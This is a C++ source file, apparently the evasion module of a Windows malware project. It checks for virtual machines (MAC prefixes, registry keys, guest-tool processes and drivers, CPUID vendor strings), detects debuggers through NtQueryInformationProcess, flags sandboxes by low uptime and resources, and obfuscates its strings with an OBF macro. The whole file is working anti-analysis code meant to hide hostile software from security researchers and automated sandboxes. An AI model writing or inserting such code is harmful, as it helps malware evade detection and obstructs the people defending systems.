#include "evasion.h"
#include "obf.h"
#include "sys.h"
#include <windows.h>
#include <intrin.h>
#include <iphlpapi.h>
#include <tlhelp32.h>

#pragma comment(lib, "iphlpapi.lib")

namespace evade {

namespace {

// ---- MAC OUIs used by hypervisors ----
static const char* k_vm_ouis[] = {
    "00:05:69", "00:0c:29", "00:1c:14", "00:50:56",   // VMware
    "08:00:27", "0a:00:27",                            // VirtualBox
    "00:15:5d",                                        // Hyper-V
    "00:16:3e",                                        // Xen
    "52:54:00",                                        // QEMU/KVM
    "00:03:ff",                                        // Microsoft Virtual PC
    "00:1c:42",                                        // Parallels
};

} // namespace

bool vm_mac_oui() {
    ULONG size = 0;
    GetAdaptersInfo(nullptr, &size);
    if (!size) return false;
    std::vector<uint8_t> buf(size);
    auto info = (PIP_ADAPTER_INFO)buf.data();
    if (GetAdaptersInfo(info, &size) != NO_ERROR) return false;
    for (auto a = info; a; a = a->Next) {
        char mac[32];
        std::snprintf(mac, sizeof(mac), "%02x:%02x:%02x:%02x:%02x:%02x",
                      a->Address[0], a->Address[1], a->Address[2],
                      a->Address[3], a->Address[4], a->Address[5]);
        for (const char* oui : k_vm_ouis)
            if (util::starts_with(mac, oui)) return true;
    }
    return false;
}

bool vm_registry() {
    HKEY k = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            util::widen(OBF("SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum")).c_str(),
            0, KEY_READ, &k) == ERROR_SUCCESS) {
        wchar_t val[512] = {};
        DWORD sz = sizeof(val), type = 0;
        if (RegQueryValueExW(k, L"0", nullptr, &type, (LPBYTE)val, &sz) == ERROR_SUCCESS) {
            std::string v = util::to_lower(util::narrow(val));
            for (const auto& needle : { OBF("vmware"), OBF("vbox"), OBF("qemu"), OBF("virtual"), OBF("xen") })
                if (v.find(needle) != std::string::npos) { RegCloseKey(k); return true; }
        }
        RegCloseKey(k);
    }
    // BIOS vendor / system manufacturer keys
    for (auto pair : { std::make_pair(OBF("HARDWARE\\DESCRIPTION\\System\\BIOS"), OBF("SystemManufacturer")),
                       std::make_pair(OBF("HARDWARE\\DESCRIPTION\\System\\BIOS"), OBF("SystemProductName")) }) {
        HKEY bk = nullptr;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, util::widen(pair.first).c_str(), 0, KEY_READ, &bk) == ERROR_SUCCESS) {
            wchar_t v[512] = {};
            DWORD sz = sizeof(v), type = 0;
            if (RegQueryValueExW(bk, util::widen(pair.second).c_str(), nullptr, &type, (LPBYTE)v, &sz) == ERROR_SUCCESS) {
                std::string s = util::to_lower(util::narrow(v));
                for (const auto& needle : { OBF("vmware"), OBF("virtualbox"), OBF("qemu"), OBF("xen"), OBF("virtual machine") })
                    if (s.find(needle) != std::string::npos) { RegCloseKey(bk); return true; }
            }
            RegCloseKey(bk);
        }
    }
    return false;
}

bool vm_processes() {
    static const char* names[] = {
        "vmtoolsd.exe", "vboxservice.exe", "vboxtray.exe", "vmwaretray.exe",
        "vmwareuser.exe", "xenservice.exe", "qemu-ga.exe", "prl_tools.exe",
        "vmsrvc.exe", "vmusrvc.exe",
    };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32W pe{};
    pe.dwSize = sizeof(pe);
    bool found = false;
    if (Process32FirstW(snap, &pe)) {
        do {
            std::string exe = util::to_lower(util::narrow(pe.szExeFile));
            for (const char* n : names)
                if (exe == n) { found = true; break; }
        } while (!found && Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return found;
}

bool vm_files() {
    std::string sys32 = util::expand_env("%SystemRoot%\\System32");
    static const char* files[] = {
        "drivers\\VBoxMouse.sys", "drivers\\VBoxGuest.sys", "drivers\\VBoxSF.sys",
        "drivers\\vmhgfs.sys", "drivers\\vmmouse.sys", "drivers\\vm3dmp.sys",
        "drivers\\xenevtchn.sys",
    };
    for (const char* f : files)
        if (util::path_exists(util::join(sys32, f))) return true;
    return false;
}

bool vm_cpuid() {
    int regs[4] = {};
    __cpuid(regs, 1);
    bool hypervisor = (regs[2] >> 31) & 1;
    if (!hypervisor) return false;
    char vendor[13] = {};
    __cpuid(regs, 0x40000000);
    memcpy(vendor, &regs[1], 4);
    memcpy(vendor + 4, &regs[2], 4);
    memcpy(vendor + 8, &regs[3], 4);
    std::string v = util::to_lower(vendor);
    return v.find("vmware") != std::string::npos || v.find("vbox") != std::string::npos ||
           v.find("kvm") != std::string::npos || v.find("xen") != std::string::npos ||
           v.find("microsoft") != std::string::npos;
}

bool debugger_present() {
    if (IsDebuggerPresent()) return true;
    BOOL remote = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &remote);
    if (remote) return true;

    // PEB checks: NtGlobalFlag + ProcessDebugPort
    auto ntdll = GetModuleHandleW(L"ntdll.dll");
    if (ntdll) {
        using NtQueryInformationProcess_t = LONG(WINAPI*)(HANDLE, ULONG, PVOID, ULONG, PULONG);
        auto fn = (NtQueryInformationProcess_t)GetProcAddress(ntdll, OBF("NtQueryInformationProcess").c_str());
        if (fn) {
            DWORD64 port = 0;
            if (fn(GetCurrentProcess(), 7 /*ProcessDebugPort*/, &port, sizeof(port), nullptr) == 0 && port != 0)
                return true;
            DWORD flags = 0;
            if (fn(GetCurrentProcess(), 0x1F /*ProcessDebugFlags*/, &flags, sizeof(flags), nullptr) == 0 && flags == 0)
                return true;
            HANDLE dbg = nullptr;
            if (fn(GetCurrentProcess(), 0x1E /*ProcessDebugObjectHandle*/, &dbg, sizeof(dbg), nullptr) == 0 && dbg)
                return true;
        }
    }
    return false;
}

bool sandbox_uptime_low() {
    ULONGLONG ms = GetTickCount64();
    return ms < 8ull * 60 * 1000; // under 8 minutes of OS uptime
}

bool sandbox_low_resources() {
    MEMORYSTATUSEX ms{};
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < 2ull * 1024 * 1024 * 1024) return true;
    SYSTEM_INFO si{};
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return true;
    return false;
}

Environment inspect() {
    Environment e;
    if (vm_cpuid())        { e.vm = true; e.reason = "cpuid"; }
    else if (vm_registry()) { e.vm = true; e.reason = "registry"; }
    else if (vm_mac_oui())  { e.vm = true; e.reason = "mac"; }
    else if (vm_processes()){ e.vm = true; e.reason = "process"; }
    else if (vm_files())    { e.vm = true; e.reason = "files"; }

    if (debugger_present()) { e.debugger = true; if (e.reason.empty()) e.reason = "debugger"; }
    if (sandbox_uptime_low() || sandbox_low_resources()) {
        e.sandbox = true;
        if (e.reason.empty()) e.reason = "sandbox";
    }
    return e;
}

} // namespace evade
